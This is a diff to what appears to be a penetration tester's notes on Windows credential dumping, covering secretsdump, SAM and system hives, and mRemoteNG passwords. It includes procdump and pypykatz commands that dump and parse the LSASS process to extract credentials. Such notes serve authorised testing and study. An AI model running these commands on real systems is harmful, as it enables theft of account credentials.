@@ -108,8 +108,10 @@ https://github.com/fortra/impacket/blob/master/examples/secretsdump.py
 file SAM  and system    #registry hives
 mRemoteNG  is a remote connection management tool, and it allows the user to save passwords for various types of connections
 
+https://juggernaut-sec.com/dumping-credentials-lsass-process-hashes/
 https://hackmd.io/@CP04042K/SyBeBluis#Command-and-Control-CampC-Frameworks
 net use Z: https://live.sysinternals.com
+#dump by the PID of the LSASS process (better)
 procdump.exe -accepteula -ma lsass.exe lsass.dmp
 pypykatz lsa lsass.dmp
 
